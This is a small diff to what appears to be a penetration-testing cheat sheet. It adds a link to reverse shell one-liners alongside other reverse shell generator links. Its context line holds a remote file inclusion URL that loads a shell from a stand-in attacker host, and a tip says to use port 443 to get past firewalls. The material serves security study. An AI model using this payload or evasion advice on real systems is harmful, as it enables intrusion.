@@ -413,6 +413,7 @@ http://example.com/index.php?page=http://example.evil/shell.txt%00
 ```
 
 ## Reverse Shell payload
+- https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/
 - https://www.revshells.com/ #Reverse Shell Generator
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/- https://guide.offsecnewbie.com/shells
 - Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
